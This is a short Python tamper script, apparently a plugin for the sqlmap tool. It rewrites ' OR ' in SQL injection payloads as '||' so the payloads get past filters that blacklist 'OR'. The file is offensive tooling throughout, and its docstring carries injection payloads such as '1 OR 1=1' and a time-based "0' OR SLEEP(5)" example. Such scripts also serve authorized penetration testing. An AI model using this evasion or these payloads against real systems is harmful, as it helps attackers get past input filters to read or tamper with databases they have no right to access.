#!/usr/bin/env python3
"""
Tamper script to replace logical OR with double pipe (||)
Useful for evading weak filters that blacklist 'OR'

Author: relunsec

"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Replaces instances of logical OR with || operator

    Example:
        Input: 1 OR 1=1
        Output: 1 || 1=1
    Requirement:
        * MySQL
    >>> tamper("0' OR SLEEP(5)")
    "0' || SLEEP(5)"
    """
    if payload:
        # Replace only ' OR ' (with spaces) to avoid breaking string literals
        return payload.replace(" OR ", " || ")
